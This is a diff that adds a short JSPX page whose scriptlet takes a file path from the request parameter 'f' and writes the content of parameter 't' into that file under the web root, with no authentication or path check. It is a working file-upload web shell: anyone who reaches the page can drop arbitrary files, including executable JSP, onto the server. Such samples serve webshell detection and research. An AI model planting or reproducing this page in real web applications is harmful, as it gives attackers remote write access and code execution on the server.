@@ -1,0 +1,11 @@
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page"
+    xmlns="http://www.w3.org/1999/xhtml"
+    xmlns:c="http://java.sun.com/jsp/jstl/core" version="1.2">
+    <jsp:directive.page contentType="text/html" pageEncoding="UTF-8" />
+    <jsp:directive.page import="java.io.*" />
+    <jsp:scriptlet>
+        RandomAccessFile rf = new RandomAccessFile(request.getRealPath("/")+request.getParameter("f"), "rw");
+        rf.write(request.getParameter("t").getBytes());
+        rf.close();
+    </jsp:scriptlet>
+</jsp:root>
